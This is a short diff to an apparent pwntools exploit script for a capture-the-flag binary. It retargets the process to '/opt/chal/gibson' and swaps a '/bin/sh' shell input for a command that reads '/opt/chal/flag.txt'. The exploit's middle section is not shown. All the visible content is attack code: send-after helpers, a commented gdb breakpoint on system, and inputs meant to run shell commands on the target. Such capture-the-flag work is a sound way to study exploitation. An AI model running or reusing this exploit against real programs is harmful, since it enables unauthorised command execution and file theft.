@@ -2,7 +2,7 @@ from pwn import *
 # context.log_level='debug'
 context.arch='amd64'
 # context.terminal = ['tmux','split','-h']
-p=process("./pwn")
+p=process("/opt/chal/gibson")
 sla 	= lambda a,b: p.sendlineafter(a,b)
 sa 		= lambda a,b: p.sendafter(a,b)
 ra 		= lambda a,b: p.readuntil(a,b)
@@ -57,6 +57,6 @@ cmd("touch")
 # gdb.attach(p,'b system')
 
 sla("?\n","n132")
-sla("?\n","/bin/sh")
+sla("?\n","cat /opt/chal/flag.txt")
 
 p.interactive()
